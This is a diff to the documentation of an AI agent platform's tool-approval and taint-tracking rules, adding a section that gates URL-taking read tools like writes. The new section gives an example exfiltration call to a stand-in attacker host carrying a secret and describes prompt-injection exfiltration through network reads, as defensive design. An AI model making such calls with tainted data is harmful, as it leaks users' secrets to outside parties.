@@ -21,7 +21,7 @@ stores behave the same).
 | Discover its tools | `POST .../tool-servers/{server}/discover` | `tools.write` | `tool.discover` |
 | Import manifests (a server the control plane cannot reach) | `POST .../tool-servers/{server}/tools` `{"manifests": [{"name", "description", "input_schema"}]}` | `tools.write` | `tool.discover` |
 | List manifests (pins, findings, status) | `GET .../tool-servers/{server}/tools` | `tools.read` | |
-| Approve a manifest | `POST .../tools/{tool}/approve` `{"pin", "acknowledge_findings"?}` | `tools.approve` | `tool.approve` (with the findings) |
+| Approve a manifest | `POST .../tools/{tool}/approve` `{"pin", "acknowledge_findings"?, "network"?}` (`network`: see [Reads that reach the network](#reads-that-reach-the-network)) | `tools.approve` | `tool.approve` (with the findings) |
 | Revoke an approval | `POST .../tools/{tool}/revoke` `{"pin"}` | `tools.approve` | `tool.revoke` |
 
 | Role | `tools.read` | `tools.write` | `tools.approve` |
@@ -181,8 +181,9 @@ every tool result the model saw, so every call it makes afterwards carries them.
 not labelled (data flow only). Tool steps journal their output labels, so a replayed run sees the
 same labels.
 
-**The rule.** A tool declared `effect: write` whose arguments carry any label other than `pii`
-needs either:
+**The rule.** A tool declared `effect: write` (or a read that
+[reaches the network](#reads-that-reach-the-network)) whose arguments carry any label other than
+`pii` needs either:
 
 - an **allowlist entry** on the tool in the node spec: `"allow_tainted": ["tool:crm/*",
   "datasource"]` (exact labels, prefixes ending in `*`, or `*`); every label must match; or
@@ -198,6 +199,35 @@ needs either:
 
 `pii` is handled by the personal-data rules above rather than by approvals: an untrusted tool never
 receives personal data, write or read.
+
+### Reads that reach the network
+
+A read tool whose arguments choose where it connects (a URL to fetch, a host to query) can carry
+data out as well as a write can: `fetch("https://attacker.example/?d=<secret>")` is an
+exfiltration even though nothing is written (P3 decision 11; the exfiltration channel AgentDojo
+and the "Design Patterns for Securing LLM Agents" paper both cover, arXiv 2406.13352, 2506.08837).
+Such a read is gated like a write: tainted arguments need an `allow_tainted` entry on the tool or
+a human approval (`<step>@approve`, question `Approve this call? ... (effect: read, reaches the
+network through its arguments)`, audited as `node.write.approve` / `node.write.deny` like a write's).
+
+How a tool is classified, both signals:
+
+1. **Schema hints** (the default, from the approved manifest's input schema): a property with
+   `format` `uri`, `url`, `iri`, `uri-reference`, `iri-reference`, `uri-template`, `hostname`,
+   `idn-hostname`, `ipv4`, `ipv6` or `email`; a property named `url`, `uri`, `href`, `link`,
+   `endpoint`, `webhook`, `host`, `hostname`, `domain`, or ending in `_url`, `_uri`, `-url`, `Url`,
+   `Uri`, `URL`; or `x-caliban-network: true` on the schema or a property (a server author can say
+   so explicitly). Nested objects, array items and combinators count. The manifest lists the
+   result as `network_hint`.
+2. **The approver's decision** (`POST .../tools/{tool}/approve {"pin", "network": true|false}`):
+   overrides the hints either way, recorded with the approval (`tool_manifest.network`, migration
+   0026), audited and shipped in the snapshot. `true` for a tool that reaches the network through an
+   argument the hints miss (a free-form `target`); `false` for one whose `link` is an internal id.
+   To change it, revoke and approve again.
+
+Built-in tools and `node://` tools are not network reads. The injection suite's `exfil.url_read`
+targets every URL-shaped read tool, also those an approver declared offline, so an override that
+switches the gate off for a tool that does take URLs fails the suite.
 
 ### Untrusted caller data
 
